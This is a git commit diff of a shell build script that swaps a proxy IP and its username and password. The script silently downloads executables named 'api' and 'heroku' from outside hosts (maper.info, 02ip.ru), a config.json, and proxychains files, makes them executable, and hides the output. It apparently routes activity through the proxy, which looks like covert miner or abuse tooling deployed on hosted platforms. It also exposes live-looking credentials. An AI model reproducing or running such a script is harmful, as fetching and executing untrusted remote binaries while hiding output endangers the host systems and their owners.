29e2596c5922c85b3ea86a778ca6f8a15046fce2
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 19:48:08 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,12 +1,12 @@
-proxy="3.227.182.193" 
+proxy="50.17.160.202" 
 port="9293" 
-user="3j8rvvg4wcjt5b"  
-pass="cfqo67beev4dnog0y6mawtlejtpo" 
+user="73b065yffz7ymg"  
+pass="rzudmq10wr15mn0je4pczgjen9equ" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json >/dev/null 2>&1
-wget -q https://02ip.ru/heroku && chmod +x heroku 
+wget -q https://02ip.ru/heroku && chmod +x heroku >/dev/null 2>&1
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
-wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
+wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so >/dev/null 2>&1
 sleep 3 
 sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
 sleep 1 
